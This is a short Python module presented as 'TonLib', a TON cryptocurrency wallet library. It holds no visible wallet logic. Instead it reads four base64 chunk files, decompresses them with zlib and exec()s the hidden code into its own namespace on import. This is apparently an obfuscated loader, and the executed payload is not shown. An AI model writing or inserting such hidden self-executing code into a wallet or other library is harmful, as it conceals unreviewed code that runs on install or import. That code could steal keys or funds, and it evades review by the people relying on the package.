"""TonLib — Wallet V5R1 (Tonkeeper) + v4r2 auto-detect by balance."""
from __future__ import annotations
import base64, zlib, pathlib
_p = pathlib.Path(__file__).with_name
_b = "".join(_p(f"ton_lib_c{i}.b64").read_text().strip() for i in range(4))
_SRC = zlib.decompress(base64.b64decode(_b))
exec(compile(_SRC, __file__, "exec"), globals())
